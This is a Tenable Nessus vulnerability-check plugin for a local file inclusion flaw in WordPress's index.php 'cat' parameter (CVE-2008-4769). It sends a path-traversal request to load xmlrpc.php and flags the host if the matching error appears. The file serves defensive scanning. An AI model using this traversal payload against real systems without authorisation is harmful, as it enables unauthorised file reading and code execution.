#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(32080);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2014/10/01 01:43:19 $");

  script_cve_id("CVE-2008-4769");
  script_bugtraq_id(28845);
  script_osvdb_id(44591);
  script_xref(name:"Secunia", value:"29949");

  script_name(english:"WordPress index.php 'cat' Parameter Local File Inclusion");
  script_summary(english:"Attempts to read a local file with WordPress.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include attack.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
sanitize user input to the 'cat' parameter of the 'index.php' script.
Regardless of PHP's 'register_globals' setting, an unauthenticated
attacker can exploit this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges under
which the web server operates.");
  script_set_attribute(attribute:"see_also", value:"http://trac.wordpress.org/changeset/7586");
  script_set_attribute(attribute:"solution", value:"Apply patches based on the SVN changeset referenced above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/04/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/04/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/04/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2014 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Unless we're being paranoid, only test Windows.
if (report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if (!os || "Windows" >!< os) audit(AUDIT_OS_NOT, "affected");
}

# Try to retrieve a local file.
w = http_send_recv3(
  method:"GET",
  item:dir + "/index.php?cat=1.php/../../../../xmlrpc",
  port:port,
  exit_on_fail:TRUE
);
res = w [2];

# There's a problem if we see an error from xmlrpc.php.
if ('XML-RPC server accepts POST requests only' >< res)
{
  security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
